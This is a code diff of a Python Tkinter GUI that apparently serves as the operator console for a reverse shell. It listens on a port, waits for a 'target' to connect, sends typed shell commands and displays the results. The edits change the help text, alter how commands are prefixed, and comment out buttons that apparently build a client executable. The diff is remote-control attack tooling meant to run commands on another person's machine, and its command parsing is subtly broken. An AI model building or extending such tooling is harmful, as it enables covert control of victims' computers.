@@ -97,7 +97,9 @@ def help_button():
     show_help += "[+] Default IP and Port is 127.0.0.1:9999\n\n"
     show_help += "[+] Click Connect Button to waiting target connect\n\n"
     show_help += "[+] If connect done, can type command and Send command\n\n"
-    show_help += "\n\n\n"
+    show_help += "[+] If need reload lhost IP or Port can click reload button\n\n"
+    show_help += "[!] Reload Button will disconnect target!\n\n"
+    show_help += "\n\n\n\n"
     show_help += "Version: v1.0\n"
     show_command.insert('end',show_help + '\n')
     show_command.see('end')
@@ -151,25 +153,24 @@ def send_command_fuc():
         show_command.insert('end',"Need Connect\n")
     elif con_flag == 1:
         show_something = enter_command.get()
-        show_command.insert('end','command send '+show_something+'\n')
-        data = show_something+" && echo [+] Command Request Done!"
-        if data == 'exit'+" && echo [+] Command Request Done!":
+        show_command.insert('end',show_something+' command send \n')
+        data = "echo [+] Command Send Done! && "+show_something
+        if data == "echo [+] Command Send Done! "+'&& exit':
             conn.send(data.encode())
             show_command.insert('end',"[X] Connect Close"+'\n')
             show_command.see('end')
             conn.close()
-        elif data.split(' ')[0] == 'start':
+        elif data.split(' ')[6] == 'start':
             conn.send(data.encode())
             show_command.insert('end','send start!'+'\n')
             show_command.see('end')
         elif data != '':
             conn.send(data.encode())
-            
 #            conn.setblocking(False)
             show_command.insert('end',(conn.recv(4096).decode('big5'))+'\n')
+            show_command.insert('end',"[+] Command Request Done!"+'\n')
             show_command.see('end')
-            
-        elif data == ' && echo [+] Command Request Done!':
+        elif data == 'echo [+] Command Send Done! &&':
             show_command.insert('end',"pls enter"+'\n')
             show_command.see('end')
             
@@ -230,13 +231,13 @@ help_button.grid(row=3,column=5)
 show_connect_information = tk.Listbox(window)
 show_connect_information.grid(row=3,column=4,sticky=tk.S,ipadx=15,ipady=5,columnspan=2,padx=15)
 show_connect_information.configure(fg='#0af000',bg='#303030')
-build_button = tk.Button(window,text='build client',command=build,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
-build_button.grid(row=1,column=7,rowspan=2,ipady=5)
+#build_button = tk.Button(window,text='build client',command=build,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
+#build_button.grid(row=1,column=7,rowspan=2,ipady=5)
 reload_button = tk.Button(window,text="reload",command=reload_button,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
 reload_button.grid(row=3 ,column=6)
-build_exe = tk.Button(window,text="build exe",command=exe,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
-build_exe.grid(row=3 ,column=7)
-command_button = tk.Button(window,text='sned open file',command=send_command_openfile,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
-command_button.grid(row=2,column=2)
+#build_exe = tk.Button(window,text="build exe",command=exe,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
+#build_exe.grid(row=3 ,column=7)
+#command_button = tk.Button(window,text='sned open file',command=send_command_openfile,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
+#command_button.grid(row=2,column=2)
 
 window.mainloop()
